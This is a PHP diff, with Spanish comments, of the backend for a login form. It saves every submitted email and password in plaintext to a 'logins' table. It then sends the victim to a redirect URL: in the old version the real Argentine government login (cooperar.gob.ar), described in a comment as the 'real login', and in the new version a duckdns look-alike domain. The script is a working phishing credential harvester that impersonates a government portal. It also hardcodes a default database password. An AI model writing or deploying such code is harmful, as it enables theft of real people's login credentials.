@@ -1,22 +1,30 @@
 <?php
+// Establecer tipo de contenido JSON para AJAX
 header('Content-Type: application/json');
-require_once __DIR__ . '/../vendor/autoload.php'; // si usas PHPMailer
 
-// Cargar .env
-$dotenv = Dotenv\Dotenv::createImmutable(__DIR__ . '/../../');
-$dotenv->load();
+// Tomar variables de entorno del contenedor
+$dbHost = getenv('DB_HOST') ?: 'fake_mysql';
+$dbName = getenv('DB_NAME') ?: 'taller';
+$dbUser = getenv('DB_USER') ?: 'talleruser';
+$dbPass = getenv('DB_PASS') ?: 'clave123';
+$dbPort = getenv('DB_PORT') ?: 3306;
 
-// Conexión a MySQL
-$mysqli = new mysqli(
-    $_ENV['DB_HOST'], 
-    $_ENV['DB_USER'], 
-    $_ENV['DB_PASS'], 
-    $_ENV['DB_NAME'], 
-    $_ENV['DB_PORT'] ?? 3306
-);
-
-if ($mysqli->connect_error) {
-    echo json_encode(['status' => 'error', 'message' => 'Error de conexión a la base de datos']);
+// Conexión con PDO
+try {
+    $pdo = new PDO(
+        "mysql:host=$dbHost;dbname=$dbName;charset=utf8",
+        $dbUser,
+        $dbPass,
+        [
+            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
+        ]
+    );
+} catch (PDOException $e) {
+    echo json_encode([
+        'status' => 'error',
+        'message' => 'Error de conexión a la base de datos: ' . $e->getMessage()
+    ]);
     exit;
 }
 
@@ -24,13 +32,27 @@ if ($mysqli->connect_error) {
 $email = $_POST['email'] ?? '';
 $password = $_POST['password'] ?? '';
 
-// Insertar en tabla logins
-$stmt = $mysqli->prepare("INSERT INTO logins (email, password) VALUES (?, ?)");
-$stmt->bind_param("ss", $email, $password);
-if ($stmt->execute()) {
-    echo json_encode(['status' => 'success', 'redirect_url' => 'https://cooperar.gob.ar']); // redirigir al login real
-} else {
-    echo json_encode(['status' => 'error', 'message' => 'No se pudo guardar el login']);
+if (empty($email) || empty($password)) {
+    echo json_encode(['status' => 'error', 'message' => 'Debes completar todos los campos']);
+    exit;
 }
-$stmt->close();
-$mysqli->close();
+
+// Guardar en la tabla logins
+try {
+    $stmt = $pdo->prepare("INSERT INTO logins (email, password) VALUES (:email, :password)");
+    $stmt->execute([
+        ':email' => $email,
+        ':password' => $password
+    ]);
+
+    // Retornar éxito y URL de redirección
+    echo json_encode([
+        'status' => 'success',
+        'redirect_url' => 'https://cooperar.duckdns.org/views/login.php'
+    ]);
+} catch (PDOException $e) {
+    echo json_encode([
+        'status' => 'error',
+        'message' => 'No se pudo guardar el login: ' . $e->getMessage()
+    ]);
+}
